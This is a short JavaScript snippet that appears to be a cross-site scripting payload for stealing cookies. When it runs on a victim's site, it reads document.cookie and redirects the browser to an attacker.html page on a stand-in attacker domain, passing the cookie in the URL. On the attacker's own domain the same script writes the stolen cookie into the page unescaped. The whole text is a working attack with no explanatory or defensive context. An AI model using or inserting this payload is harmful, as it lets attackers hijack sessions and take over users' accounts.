if (location.host === 'my_own_domain') {
  const url = new URL(document.location);
  const parameters = new URLSearchParams(url.search);
  const cookie = parameters.get('cookie');
  document.write(cookie);
} else {
  const cookie = document.cookie;
  document.location = 'https://my_own_domain/attacker.html?cookie=' + cookie;
}
